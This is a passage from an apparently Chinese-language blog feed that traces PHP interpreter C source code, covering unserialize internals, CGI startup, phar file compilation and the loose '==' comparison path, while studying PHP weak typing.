zend_lookup_class_ex()"></a>zend_execute_api.c zend_lookup_class_ex()</h3><p>这个函数主要是查找类的<code>zend_class_entry</code>过程</p><p>其中有段代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key) &#123;</span><br><span class="line">lc_name = key;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (name == <span class="literal">NULL</span> || !ZSTR_LEN(name)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ZSTR_VAL(name)[<span class="number">0</span>] == <span class="string">'\\'</span>) &#123;</span><br><span class="line">lc_name = zend_string_alloc(ZSTR_LEN(name) - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">zend_str_tolower_copy(ZSTR_VAL(lc_name), ZSTR_VAL(name) + <span class="number">1</span>, ZSTR_LEN(name) - <span class="number">1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">lc_name = zend_string_tolower(name);<span class="comment">//这里会将序列化中的大写转小写</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">zv = zend_hash_find(EG(class_table), lc_name);</span><br></pre></td></tr></table></figure><p>这段代码中的tolower将我们传入的大写的序列化字符串的类名转成小写。然后在EG中寻找类。</p><blockquote><p> 所有PHP脚本中定义的类以及内核、扩展中定义的内部类通过一个以”类名”作为索引的哈希表存储，这个哈希表保存在Zend引擎global变量中：<strong>zend_executor_globals.class_table</strong>(即：<strong>EG(class_table)</strong>)</p></blockquote><p>找到类后，将类的信息给到ce变量，然后继续解析类中属性的个数，解析完成以后查看是否有__unserialize(),查找方法和之前类名的查找一样，先将类名转成hash，然后再在EG表中查找。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">has_unserialize = !incomplete_class</span><br><span class="line">&amp;&amp; zend_hash_str_exists(&amp;ce-&gt;function_table, <span class="string">"__unserialize"</span>, <span class="keyword">sizeof</span>(<span class="string">"__unserialize"</span>)<span class="number">-1</span>);</span><br></pre></td></tr></table></figure><p>紧接着再初始化对象<code>object_init_ex(rval, ce)</code>,初始化完成后进入</p><h3 id="object-common-UNSERIALIZE-PASSTHRU-elements-has-unserialize）"><a href="#object-common-UNSERIALIZE-PASSTHRU-elements-has-unserialize）" class="headerlink" title="object_common(UNSERIALIZE_PASSTHRU, elements, has_unserialize）"></a>object_common(UNSERIALIZE_PASSTHRU, elements, has_unserialize）</h3><p>在这个函数中会查看是否有__wakeup函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">has_wakeup = Z_OBJCE_P(rval) != PHP_IC_ENTRY</span><br><span class="line">&amp;&amp; zend_hash_str_exists(&amp;Z_OBJCE_P(rval)-&gt;function_table, <span class="string">"__wakeup"</span>, <span class="keyword">sizeof</span>(<span class="string">"__wakeup"</span>)<span class="number">-1</span>);</span><br></pre></td></tr></table></figure><p>之后进入<code>Z_OBJPROP_P(rval)</code>,这个函数中有个关键函数<code>rebuild_object_properties(zobj)</code>。</p><h3 id="zend-object-handlers-c-rebuild-object-properties"><a href="#zend-object-handlers-c-rebuild-object-properties" class="headerlink" title="zend_object_handlers.c rebuild_object_properties()"></a>zend_object_handlers.c rebuild_object_properties()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ZEND_HASH_FOREACH_PTR(&amp;ce-&gt;properties_info, prop_info) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(prop_info-&gt;flags &amp; ZEND_ACC_STATIC)) &#123;</span><br><span class="line">flags |= prop_info-&gt;flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (UNEXPECTED(Z_TYPE_P(OBJ_PROP(zobj, prop_info-&gt;offset)) == IS_UNDEF)) &#123;</span><br><span class="line">HT_FLAGS(zobj-&gt;properties) |= HASH_FLAG_HAS_EMPTY_IND;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_zend_hash_append_ind(zobj-&gt;properties, prop_info-&gt;name,</span><br><span class="line">OBJ_PROP(zobj, prop_info-&gt;offset));</span><br><span class="line">&#125;</span><br><span class="line">&#125; ZEND_HASH_FOREACH_END();</span><br></pre></td></tr></table></figure><p>通过一个foreach语句将source和str属性名传入ce（保存类的结构体）</p><p>现在又回到object_comment()函数中</p><p>其中有个很重要的函数<code>process_nested_data(UNSERIALIZE_PASSTHRU, ht, elements, Z_OBJ_P(rval))</code></p><h3 id="var-unserialize-re-process-nested-data"><a href="#var-unserialize-re-process-nested-data" class="headerlink" title="var_unserialize.re process_nested_data()"></a>var_unserialize.re process_nested_data()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (elements-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">zval key, *data, d, *old_data;</span><br><span class="line">zend_ulong idx;</span><br><span class="line">zend_property_info *info = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">ZVAL_UNDEF(&amp;key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!php_var_unserialize_internal(&amp;key, p, <span class="built_in">max</span>, <span class="literal">NULL</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">zval_ptr_dtor(&amp;key);</span><br><span class="line"><span class="keyword">goto</span> failure;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数继续调用php_var_unserialize_internal()进行取值操作，然后就是之前的解析类型名，解析长度，解析完成后返回此函数，进行下一步，属性名解析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((unmangled_class == <span class="literal">NULL</span> || !<span class="built_in">strcmp</span>(unmangled_class, <span class="string">"*"</span>) || !strcasecmp(unmangled_class, ZSTR_VAL(obj-&gt;ce-&gt;name)))</span><br><span class="line">                            &amp;&amp; (existing_propinfo != <span class="literal">NULL</span>)</span><br><span class="line">&amp;&amp; (existing_propinfo-&gt;flags &amp; ZEND_ACC_PPP_MASK)) &#123;</span><br><span class="line"><span class="keyword">if</span> (existing_propinfo-&gt;flags &amp; ZEND_ACC_PROTECTED) &#123;</span><br><span class="line">new_key = zend_mangle_property_name(</span><br><span class="line"><span class="string">"*"</span>, <span class="number">1</span>, ZSTR_VAL(unmangled), ZSTR_LEN(unmangled), <span class="number">0</span>);</span><br><span class="line">zend_string_release_ex(unmangled, <span class="number">0</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (existing_propinfo-&gt;flags &amp; ZEND_ACC_PRIVATE) &#123;</span><br><span class="line"><span class="keyword">if</span> (unmangled_class != <span class="literal">NULL</span> &amp;&amp; <span class="built_in">strcmp</span>(unmangled_class, <span class="string">"*"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">new_key = zend_mangle_property_name(</span><br><span class="line">unmangled_class, <span class="built_in">strlen</span>(unmangled_class),</span><br><span class="line">ZSTR_VAL(unmangled), ZSTR_LEN(unmangled),</span><br><span class="line"><span class="number">0</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">new_key = zend_mangle_property_name(</span><br><span class="line">ZSTR_VAL(existing_propinfo-&gt;ce-&gt;name), ZSTR_LEN(existing_propinfo-&gt;ce-&gt;name),</span><br><span class="line">ZSTR_VAL(unmangled), ZSTR_LEN(unmangled),</span><br><span class="line"><span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">zend_string_release_ex(unmangled, <span class="number">0</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ZEND_ASSERT(existing_propinfo-&gt;flags &amp; ZEND_ACC_PUBLIC);</span><br><span class="line">new_key = unmangled;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处进行解析属性的类型，例如是private还是protected或者public，解析完成后继续进入php_var_unserialize_internal()进行解析属性值，然后将属性值传入生成的对象中</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;php内核学习三&quot;&gt;&lt;a href=&quot;#php内核学习三&quot; class=&quot;headerlink&quot; title=&quot;php内核学习三&quot;&gt;&lt;/a&gt;php内核学习三&lt;/h1&gt;&lt;h2 id=&quot;一、前沿&quot;&gt;&lt;a href=&quot;#一、前沿&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="php" scheme="https://knightswd.github.io/categories/php/"/>
    
    
      <category term="ctf" scheme="https://knightswd.github.io/tags/ctf/"/>
    
      <category term="php内核" scheme="https://knightswd.github.io/tags/php%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>php内核学习(二)</title>
    <link href="https://knightswd.github.io/2020/03/18/php%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/"/>
    <id>https://knightswd.github.io/2020/03/18/php%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/</id>
    <published>2020-03-18T10:20:01.000Z</published>
    <updated>2020-03-18T10:34:36.046Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php内核学习-2"><a href="#php内核学习-2" class="headerlink" title="php内核学习(2)"></a>php内核学习(2)</h1><p>开始的时候，找函数下断点找得够呛，网上查资料想起来，php内核的操作符都在zend的zend_operators.c里面，应该去这里面找的==操作符的函数下断点，然后进行调试，此模式为cgi模式</p><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">"0e12331"</span>==<span class="string">"0e4543"</span>);</span><br></pre></td></tr></table></figure><h2 id="cgi-main-c-main"><a href="#cgi-main-c-main" class="headerlink" title="cgi_main.c main()"></a>cgi_main.c main()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((query_string = getenv(<span class="string">"QUERY_STRING"</span>)) != <span class="literal">NULL</span> &amp;&amp; <span class="built_in">strchr</span>(query_string, <span class="string">'='</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">/* we've got query string that has no = - apache CGI will pass it to command line */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *p;</span><br><span class="line">decoded_query_string = strdup(query_string);</span><br><span class="line">php_url_decode(decoded_query_string, <span class="built_in">strlen</span>(decoded_query_string));</span><br><span class="line"><span class="keyword">for</span> (p = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)decoded_query_string; *p &amp;&amp;  *p &lt;= <span class="string">' '</span>; p++) &#123;</span><br><span class="line"><span class="comment">/* skip all leading spaces */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(*p == <span class="string">'-'</span>) &#123;</span><br><span class="line">skip_getopt = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(decoded_query_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>url中查询中编码的字符串在此处解码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">we never take stdin if we're (f)cgi, always</span></span><br><span class="line"><span class="comment">rely on the web server giving us the info</span></span><br><span class="line"><span class="comment">we need in the environment.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span> (SG(request_info).path_translated || cgi || fastcgi) &#123;</span><br><span class="line">zend_stream_init_filename(&amp;file_handle, SG(request_info).path_translated);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">zend_stream_init_fp(&amp;file_handle, <span class="built_in">stdin</span>, <span class="string">"Standard input code"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* request startup only after we've done all we can to</span></span><br><span class="line"><span class="comment"> * get path_translated */</span></span><br><span class="line"><span class="keyword">if</span> (php_request_startup() == FAILURE) &#123;</span><br><span class="line"><span class="keyword">if</span> (fastcgi) &#123;</span><br><span class="line">fcgi_finish_request(request, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">SG(server_context) = <span class="literal">NULL</span>;</span><br><span class="line">php_module_shutdown();</span><br><span class="line"><span class="keyword">return</span> FAILURE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将服务器传输过来的数据存入结构体</p><h2 id="main-c-php-execute-script"><a href="#main-c-php-execute-script" class="headerlink" title="main.c php_execute_script()"></a>main.c php_execute_script()</h2><p>这个和后面的查找函数，分析数据就和之前第一版的一样了，这里主要是研究php弱类型，所以这次我们进入zend_compile_file()的函数编译阶段</p><h2 id="phar-c-phar-compile-file"><a href="#phar-c-phar-compile-file" class="headerlink" title="phar.c phar_compile_file()"></a>phar.c phar_compile_file()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(file_handle-&gt;filename, <span class="string">".phar"</span>) &amp;&amp; !<span class="built_in">strstr</span>(file_handle-&gt;filename, <span class="string">"://"</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (SUCCESS == phar_open_from_filename((<span class="keyword">char</span>*)file_handle-&gt;filename, <span class="built_in">strlen</span>(file_handle-&gt;filename), <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;phar, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (phar-&gt;is_zip || phar-&gt;is_tar) &#123;</span><br><span class="line">zend_file_handle f = *file_handle;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* zip or tar-based phar */</span></span><br><span class="line">spprintf(&amp;name, <span class="number">4096</span>, <span class="string">"phar://%s/%s"</span>, file_handle-&gt;filename, <span class="string">".phar/stub.php"</span>);</span><br><span class="line"><span class="keyword">if</span> (SUCCESS == phar_orig_zend_open((<span class="keyword">const</span> <span class="keyword">char</span> *)name, &amp;f)) &#123;</span><br><span class="line"></span><br><span class="line">efree(name);</span><br><span class="line">name = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">f.filename = file_handle-&gt;filename;</span><br><span class="line"><span class="keyword">if</span> (f.opened_path) &#123;</span><br><span class="line">efree(f.opened_path);</span><br><span class="line">&#125;</span><br><span class="line">f.opened_path = file_handle-&gt;opened_path;</span><br><span class="line">f.free_filename = file_handle-&gt;free_filename;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (file_handle-&gt;type) &#123;</span><br><span class="line"><span class="keyword">case</span> ZEND_HANDLE_STREAM:</span><br><span class="line"><span class="keyword">if</span> (file_handle-&gt;handle.stream.closer &amp;&amp; file_handle-&gt;handle.stream.handle) &#123;</span><br><span class="line">file_handle-&gt;handle.stream.closer(file_handle-&gt;handle.stream.handle);</span><br><span class="line">&#125;</span><br><span class="line">file_handle-&gt;handle.stream.handle = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">*file_handle = f;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (phar-&gt;flags &amp; PHAR_FILE_COMPRESSION_MASK) &#123;</span><br><span class="line">zend_file_handle_dtor(file_handle);</span><br><span class="line"><span class="comment">/* compressed phar */</span></span><br><span class="line">file_handle-&gt;type = ZEND_HANDLE_STREAM;</span><br><span class="line"><span class="comment">/* we do our own reading directly from the phar, don't change the next line */</span></span><br><span class="line">file_handle-&gt;handle.stream.handle  = phar;</span><br><span class="line">file_handle-&gt;handle.stream.reader  = phar_zend_stream_reader;</span><br><span class="line">file_handle-&gt;handle.stream.closer  = <span class="literal">NULL</span>;</span><br><span class="line">file_handle-&gt;handle.stream.fsizer  = phar_zend_stream_fsizer;</span><br><span class="line">file_handle-&gt;handle.stream.isatty  = <span class="number">0</span>;</span><br><span class="line">phar-&gt;is_persistent ?</span><br><span class="line">php_stream_rewind(PHAR_G(cached_fp)[phar-&gt;phar_pos].fp) :</span><br><span class="line">php_stream_rewind(phar-&gt;fp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对phar的处理，就解释了为什么phar://phar.phar/xxx后面可以是任意的文件名了。</p><h2 id="zend-language-scanner-l-compile-file"><a href="#zend-language-scanner-l-compile-file" class="headerlink" title="zend_language_scanner.l compile_file()"></a>zend_language_scanner.l compile_file()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (open_file_for_scanning(file_handle)==FAILURE) &#123;</span><br><span class="line"><span class="keyword">if</span> (!EG(exception)) &#123;</span><br><span class="line"><span class="keyword">if</span> (type==ZEND_REQUIRE) &#123;</span><br><span class="line">zend_message_dispatcher(ZMSG_FAILED_REQUIRE_FOPEN, file_handle-&gt;filename);</span><br><span class="line">zend_bailout();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">zend_message_dispatcher(ZMSG_FAILED_INCLUDE_FOPEN, file_handle-&gt;filename);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">op_array = zend_compile(ZEND_USER_FUNCTION);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开之前传人的文件，即获取文件内容，接着就是调用re2c和bison进行语法解析和词法解析，将代码解析成抽象语法树(ast树)的过程了。</p><h2 id="zend-operators-c-is-equal-function"><a href="#zend-operators-c-is-equal-function" class="headerlink" title="zend_operators.c is_equal_function()"></a>zend_operators.c is_equal_function()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ZEND_API <span class="keyword">int</span> ZEND_FASTCALL <span class="title">is_equal_function</span><span class="params">(zval *result, zval *op1, zval *op2)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ZVAL_BOOL(result, zend_compare(op1, op2) == <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处主要是调用zend_compare()来进行比较</p><h2 id="zend-operators-c-zend-compare"><a href="#zend-operators-c-zend-compare" class="headerlink" title="zend_operators.c zend_compare()"></a>zend_operators.c zend_compare()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">switch</span> (TYPE_PAIR(Z_TYPE_P(op1), Z_TYPE_P(op2))) &#123;<span class="comment">//根据两个数的类型来进行比较</span></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_LONG, IS_LONG)</span>:</span></span><br><span class="line">return Z_LVAL_P(op1)&gt;Z_LVAL_P(op2)?1:(Z_LVAL_P(op1)&lt;Z_LVAL_P(op2)?-1:0);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_DOUBLE, IS_LONG)</span>:<span class="comment">//将long转成double</span></span></span><br><span class="line"><span class="function"><span class="keyword">return</span> <span class="title">ZEND_NORMALIZE_BOOL</span><span class="params">(Z_DVAL_P(op1) - (<span class="keyword">double</span>)Z_LVAL_P(op2))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_LONG, IS_DOUBLE)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">return</span> <span class="title">ZEND_NORMALIZE_BOOL</span><span class="params">((<span class="keyword">double</span>)Z_LVAL_P(op1) - Z_DVAL_P(op2))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_DOUBLE, IS_DOUBLE)</span>:</span></span><br><span class="line"><span class="function"><span class="title">if</span> <span class="params">(Z_DVAL_P(op1) == Z_DVAL_P(op2))</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ZEND_NORMALIZE_BOOL(Z_DVAL_P(op1) - Z_DVAL_P(op2));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_ARRAY, IS_ARRAY)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">return</span> <span class="title">zend_compare_arrays</span><span class="params">(op1, op2)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_NULL, IS_NULL)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_NULL, IS_FALSE)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_FALSE, IS_NULL)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_FALSE, IS_FALSE)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_TRUE, IS_TRUE)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">return</span> 0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_NULL, IS_TRUE)</span>:</span></span><br><span class="line">return -1;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_TRUE, IS_NULL)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">return</span> 1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_STRING, IS_STRING)</span>:</span></span><br><span class="line"><span class="function"><span class="title">if</span> <span class="params">(Z_STR_P(op1) == Z_STR_P(op2))</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> zendi_smart_strcmp(Z_STR_P(op1), Z_STR_P(op2));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_NULL, IS_STRING)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">return</span> <span class="title">Z_STRLEN_P</span><span class="params">(op2)</span> </span>== <span class="number">0</span> ? <span class="number">0</span> : <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_STRING, IS_NULL)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">return</span> <span class="title">Z_STRLEN_P</span><span class="params">(op1)</span> </span>== <span class="number">0</span> ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_OBJECT, IS_NULL)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">return</span> 1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">case</span> <span class="title">TYPE_PAIR</span><span class="params">(IS_NULL, IS_OBJECT)</span>:</span></span><br><span class="line">return -1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">if</span> 